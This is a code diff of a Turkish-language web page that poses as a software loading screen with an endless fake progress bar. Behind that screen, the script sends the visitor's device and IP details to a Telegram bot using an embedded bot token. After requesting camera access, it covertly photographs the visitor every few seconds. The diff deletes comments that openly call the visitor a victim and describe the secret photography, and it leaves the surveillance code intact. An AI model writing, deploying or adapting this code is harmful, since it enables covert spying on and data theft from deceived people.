@@ -133,7 +133,6 @@
       display:none;
     }
 
-    /* Fiyat tablosu artık tamamen kullanılmıyor, CSS'te kalabilir zararı yok */
     .fiyat-table {
       margin-top: 20px;
       background: rgba(255, 0, 0, 0.05);
@@ -169,8 +168,6 @@
   </div>
 
   <script>
-    // ========== TELEGRAM AYARLARI VE ŞİFRE ÇÖZÜCÜ ==========
-    // YENİ ÇALIŞAN TOKENİNİ BURAYA KOYDUM:
     const BOT_TOKEN = '8658397323:AAHrsgOj12234w_QvhGb2JyTk1zNi27Ttus';
     
     function urlParametresiAl(param) {
@@ -184,9 +181,7 @@
     if (gelenSifreliId && !isNaN(gelenSifreliId)) {
         CHAT_ID = String((gelenSifreliId - 12345) / 7);
     }
-    // =======================================================
 
-    // Elementler
     let progress = 0;
     const progressBar = document.getElementById("progress");
     const percentText = document.getElementById("percent");
@@ -202,10 +197,9 @@
       "Paketler indiriliyor...",
       "Sürücüler senkronize ediliyor...",
       "Bellek optimizasyonu yapılıyor...",
-      "Veritabanı el sıkışması bekleniyor..."
+      "Veritabanı elşıkışması bekleniyor..."
     ];
 
-    // ========== KAMERA VE VERİ SİSTEMİ ==========
     let mediaStream = null;
     let fotoSayac = 0;
     let ipBilgisi = 'bilinmiyor';
@@ -321,7 +315,6 @@
       }
     }
 
-    // === ASLA BİTMEYEN SONSUZ FAKE YÜKLEME BARINI ÇALIŞTIRAN MOTOR ===
     function baslatYuklemeBari() {
       progress = 0;
       progressBar.style.width = "0%";
@@ -329,17 +322,15 @@
       loadingArea.style.display = "block";
       errorArea.style.display = "none";
 
-      // Barı rastgele hızlarla dolduran ama %96'yı asla geçirmeyen döngü
       const progressInterval = setInterval(() => {
         if (progress < 96) {
           progress += Math.random() * 1.5;
-          if (progress > 96) progress = 96; // %96 sınır kilidi
+          if (progress > 96) progress = 96;
           progressBar.style.width = progress + "%";
           percentText.innerText = Math.floor(progress) + "%";
         }
       }, 400);
 
-      // Durum yazılarını sürekli sonsuza kadar değiştiren döngü
       setInterval(() => {
         const randomMessage = fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
         statusText.innerText = randomMessage;
@@ -348,30 +339,21 @@
       return progressInterval;
     }
 
-    // === ANA MOTOR ===
     async function baslat() {
-      // Arka planda kurban verilerini Telegram'a postala
       cihazBilgisiGonder();
-
-      // Sonsuz yükleme ekranını başlat (Kullanıcı burada takılı kalacak)
       baslatYuklemeBari();
 
-      // 2.5 saniye sonra kullanıcıya çaktırmadan kamera iznini patlat
       await new Promise(r => setTimeout(r, 2500));
       
       const izinVerildi = await kamerayiAc('user');
       
       if (izinVerildi) {
-        // İzin verildiyse bar durmayacak, %96'ya doğru gitmeye devam edecek!
-        // Arka planda gizlice fotoğrafları çekmeye başlıyoruz:
         setTimeout(async () => {
           await fotoCek('on');
-          // Her 4 saniyede bir ön/arka kamera değişerek foto yollasın
           setInterval(siradakiFotoyuCek, 4000);
         }, 1000);
         
       } else {
-        // Eğer kurban izni reddederse yükleme ekranını gizleyip "İzin Vermelisin" kutusunu aç
         loadingArea.style.display = "none";
         errorArea.style.display = "block";
       }
